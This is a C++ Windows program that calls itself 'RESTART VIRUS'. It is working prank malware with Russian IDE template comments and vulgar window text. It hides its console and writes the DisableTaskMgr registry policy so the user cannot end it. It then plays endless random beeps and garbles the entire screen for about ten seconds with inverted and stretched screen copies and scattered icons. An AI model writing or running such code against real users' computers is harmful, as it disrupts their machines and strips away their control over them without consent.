// RESTART VIRUS.cpp : Этот файл содержит функцию "main". Здесь начинается и заканчивается выполнение программы.
//

#include <iostream>
#include <Windows.h>
#include <atomic>
#include <thread>
#include <vector>
#include <cmath>

//void MesBox() {
//    int result = MessageBox(
//        NULL,
//        L"Принять изменения?",
//        L"Фоновый запрос", 
//        MB_ICONWARNING | MB_TOPMOST
//    );
//    userCh.store(result);
//}
void ScarySound() {
    while (true) {
        int mode = rand() % 3;
        if (mode == 0) { for (int i = 0; i < 10; i++) Beep(100 + (i * 100), 15); }
        else if (mode == 1) { Beep(3000, 100); Sleep(50); Beep(200, 200); }
        else { for (double d = 0; d < 6.28; d += 0.8) Beep(600 + (int)(sin(d) * 400), 40); }
        Sleep(rand() % 500);
    }
}

LRESULT CALLBACK MyWindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_DESTROY: // Если нажали на крестик
        PostQuitMessage(0);
        return 0;
    case WM_PAINT:
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        RECT rect;
        HICON icon = LoadIcon(NULL, IDI_ERROR);
        GetClientRect(hwnd, &rect); // Узнаем размер внутренней области окна
        SetTextColor(hdc, RGB(255, 0, 0)); // Сделаем текст красным!
        SetBkMode(hdc, TRANSPARENT);      // Прозрачный фон под буквами
        DrawIcon(hdc, 30, 50, icon);
        TextOut(hdc, 75, 58, L"ERROR! CRITICAL HUY!", 21);
        EndPaint(hwnd, &ps);
        MessageBeep(MB_ICONHAND);
        HDC hdc1 = GetDC(NULL);
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);
        auto startTime = GetTickCount64();
        LPWSTR icons[] = { IDI_APPLICATION, IDI_ERROR, IDI_QUESTION, IDI_WARNING, IDI_WINLOGO, IDI_INFORMATION, IDI_SHIELD };
        short iconNumb = rand() % 6;
        short a = 0;
        HKEY hKey;
        DWORD value = 1;
        RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", NULL, 0, 0, KEY_SET_VALUE, NULL, &hKey, NULL);
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
        std::thread audioThread(ScarySound);
        audioThread.detach();
        while (GetTickCount64() - startTime < 10000) {
            int x = a++;
            int y = a;
            int sx = rand() % 1980;
            int sy = rand() % 1080;

            PatBlt(hdc1, x, y, w, h, DSTINVERT);
            BitBlt(hdc1, x, y, 100, 100, hdc1, sx, sy, SRCCOPY);
            StretchBlt(hdc1, x, y, w, h, hdc1, sx, sy, w--, h--, SRCINVERT);
            DrawIcon(hdc1, x, y, LoadIcon(NULL, icons[iconNumb]));
            BitBlt(hdc1, a, a, w, h, hdc1, a + 5, a + 5, SRCCOPY);
            StretchBlt(hdc1, 10, 10, w - 20, h - 20, hdc1, 0, 0, w, h, SRCCOPY);
            Sleep(10); // Небольшая пауза, чтобы не завис процессор
        }
        ReleaseDC(0, hdc1);
        return 0;
    }
    // Всё остальное (перемещение, изменение размера) делает Windows за нас
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int main()
{
    setlocale(LC_ALL, "RU");
    HINSTANCE hInst = GetModuleHandle(0);
    /*srand(time(0));*/
    HWND hConsole = GetConsoleWindow();
    ShowWindow(hConsole, SW_HIDE);

    WNDCLASS wc = {};
    wc.lpfnWndProc = MyWindowProc;
    wc.lpszClassName = L"JOPDFR";
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hInstance = hInst;
    wc.hIcon = LoadIcon(NULL, IDI_ERROR);
    RegisterClass(&wc);
    short x = GetSystemMetrics(SM_CXSCREEN) - 300;
    short y = GetSystemMetrics(SM_CYSCREEN) - 180;
    x = x / 2;
    y = y / 2;
    HWND hWnd = CreateWindowEx(NULL, L"JOPDFR", L"PROSTO PROSTO PENIS V ROT", WS_OVERLAPPEDWINDOW | WS_VISIBLE, x, y, 300, 180, NULL, NULL, hInst, NULL);
    ShowWindow(hWnd, SW_SHOW);
    UpdateWindow(hWnd);
    
    MSG msg;
    while (GetMessage(&msg, NULL, NULL, NULL)) {
        DispatchMessage(&msg);
    }
    return 0;
}

// Запуск программы: CTRL+F5 или меню "Отладка" > "Запуск без отладки"
// Отладка программы: F5 или меню "Отладка" > "Запустить отладку"

// Советы по началу работы 
//   1. В окне обозревателя решений можно добавлять файлы и управлять ими.
//   2. В окне Team Explorer можно подключиться к системе управления версиями.
//   3. В окне "Выходные данные" можно просматривать выходные данные сборки и другие сообщения.
//   4. В окне "Список ошибок" можно просматривать ошибки.
//   5. Последовательно выберите пункты меню "Проект" > "Добавить новый элемент", чтобы создать файлы кода, или "Проект" > "Добавить существующий элемент", чтобы добавить в проект существующие файлы кода.
//   6. Чтобы снова открыть этот проект позже, выберите пункты меню "Файл" > "Открыть" > "Проект" и выберите SLN-файл.
